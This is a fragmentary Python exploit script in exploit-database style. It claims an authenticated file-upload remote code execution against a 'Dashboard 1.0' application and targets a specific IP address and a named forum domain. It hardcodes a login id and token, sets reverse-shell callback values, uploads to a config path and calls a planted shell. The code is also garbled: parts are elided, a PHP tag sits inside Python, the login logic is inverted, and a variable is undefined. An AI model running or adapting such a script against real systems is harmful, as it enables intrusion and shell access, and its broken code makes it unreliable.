# Exploit Title: (Dashboard) 1.0 - File Upload RCE (Authenticated)
# Date: 2021-03-11
# Version: 1.0
#CHANGE_THIS = add your TARGET&INFO
...
response = requests.get('http://gamesense.pub/', verify = False) 
...
def main():
    ...
    ##### Change info here #####
    TARGET_IP="167.114.11.55"
    REV_IP="127.0.0.1"
    REV_PORT="8888"
    ############################

    LOGIN="/forums/index.php/index.php/login.php?action=in&amp;id=2762&amp;csrf_token=3abdf04a922c5bd199a644fe73e4e94267711717"
    MAILING_LIST="//data/w3/app/"
    UPLOAD_URL="//i../app/config.py"
    VIEW_ITEM="/data/w3/app/config.py"
    CALL_URL="/static/js/notifications.js?v=4"
...
?>"""
    ...
    def login(url,username, password):
        try:    
            data = {
                "uid":"2762",
                "upass":"3abdf04a922c5bd199a644fe73e4e94267711717",
                "btnlogin":"Login"
            }
...
#Login
    base_url=f"http://gamesense.pub/login.php?action=in&amp;id=2762&amp;csrf_token=3abdf04a922c5bd199a644fe73e4e94267711717"
    login_url=f"{LOGIN}{LOGIN}"
    b=login(login_url, "", "")
    if not b:
        print("Welcome, Admin, shell@ 127.0.0.1:3389")
        base=f"{base_url}"
...
#CAll shell
    ...
    c_url=f"{base}{CALL_URL}{CALL_URL_PART}"
    s.get(c_url)
    #Shell can be found at /temp/include/modules/random/uploads/
